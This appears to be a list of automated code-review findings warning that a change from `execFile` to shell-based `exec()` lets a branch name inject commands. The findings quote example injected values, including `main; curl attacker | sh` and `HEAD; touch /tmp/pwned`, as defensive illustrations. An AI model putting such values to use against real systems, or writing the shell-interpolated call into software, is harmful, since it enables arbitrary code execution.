findings.title: [P1] Pass the branch as an argv element, not shell source
findings.body: When `branch` contains shell syntax, such as `HEAD; touch /tmp/pwned`, `exec()` evaluates it through the system shell and executes the appended command with the application's privileges. The previous `execFile("git", ["show", branch])` implementation passed the value literally and prevented this command injection.

findings.title: [P2] Preserve the branch name as a single process argument
findings.body:
A valid Git branch such as `topic&fix` is parsed by the shell as `git show topic` running in the background followed by `fix`. The returned process therefore reports the wrong command’s status/output, and cancellation may leave the background Git process running.

_Recommend validating this comment independently._

findings.title: [P1] Pass the branch as an argv element, not shell source
findings.body:
`exec` evaluates `branch` through the system shell. On POSIX, input such as `HEAD; touch /tmp/pwned` executes the appended command with the application’s privileges. The previous `execFile` implementation passed the branch literally, so any caller-controlled branch now enables command injection.

_Recommend validating this comment independently._

findings.title: [P1] Pass the branch as an argument instead of interpolating it into a shell command
findings.body:
`exec()` invokes a shell, so any externally influenced branch value containing shell syntax (for example, `main; curl attacker | sh`) executes arbitrary commands with the application’s privileges. The previous `execFile()` call treated the branch as a literal argument and prevented this command injection.

_Recommend validating this comment independently._

findings.title: [P1] Restore argument-based spawning to prevent unowned resource-consuming processes
findings.body:
If `branch` is caller-controlled, shell metacharacters can launch arbitrary background commands (for example, `HEAD; yes >/dev/null &`). Those descendants can consume CPU or memory and are not reliably owned or terminated through the returned `ChildProcess`, enabling resource exhaustion.

_Recommend validating this comment independently._
